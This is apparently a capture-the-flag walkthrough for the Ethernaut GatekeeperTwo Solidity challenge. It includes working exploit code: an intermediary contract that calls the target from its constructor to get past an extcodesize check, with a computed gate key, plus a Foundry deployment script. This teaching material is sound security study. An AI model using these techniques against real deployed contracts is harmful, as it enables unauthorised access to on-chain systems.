# Ethernaut Level 14 GatekeeperTwo

---

Contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

We have to pass three gates to register as an entrant. From `gateOne()` modifier we can see that we have to create a middle layer contract so that `msg.sender` is the middle layer contract which calls the function `enter` while `tx.origin` is our EOA. From the incline assembly inside `gateTwo()` , we can see that the `extcodesize(caller())` has to be 0. In assembly, `caller()` is equivalent to `msg.sender` in Solidity. `extcodesize()` == 0 basically means that the length of the *deployed* code from the address should be 0. It seems contradictory since we have to call function `enter()` inside the `MiddleLayer` logic, and it cannot be an empty contract. However, we can do a little bit trick in the `constrcutor` of  `MiddleLayer`. We will call function `enter()` inside the `constructor` since during the execution of the `constructor`, the *runtime code* is not yet deployed, thus meet the requirement from `gateTwo()`.

From `gateThree()` we can see that `uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey)` has to be all 1 in bits, which means that the `_gateKey` has to be different with `uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))` bitwise. We can easily calculate the `_gateKey` using `~` bitwise Not.

`MiddleLayer.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MiddleLayer {
    constructor(address gatekeeperAddress) {
        uint64 temp = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 key = ~ temp;

        (bool success, ) = gatekeeperAddress.call(
            abi.encodeWithSignature("enter(bytes8)", bytes8(key))
        );
        require(success, "Failed to enter the gatekeeper");
    }
}
```

We can see that all the logic of the contract is inside the `constructor`. 

`GatekeeperTwo.s.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {GatekeeperTwo} from "../src/GatekeeperTwo.sol";
import {MiddleLayer} from "../src/MiddleLayer.sol";

contract GatekeeperTwoScript is Script {
    GatekeeperTwo gatekeeperTwo = GatekeeperTwo(0xXXXXXXXXXXX);
    MiddleLayer middleLayer;

    function run() external {
        console.log("Current entrant is:", gatekeeperTwo.entrant());
        vm.startBroadcast();
        middleLayer = new MiddleLayer(address(gatekeeperTwo));
        vm.stopBroadcast();
        console.log("Entrant is:", gatekeeperTwo.entrant());
    }
}
```

All we have to do in the script is to simply deploy the `middleLayer` which triggers the `constructor`.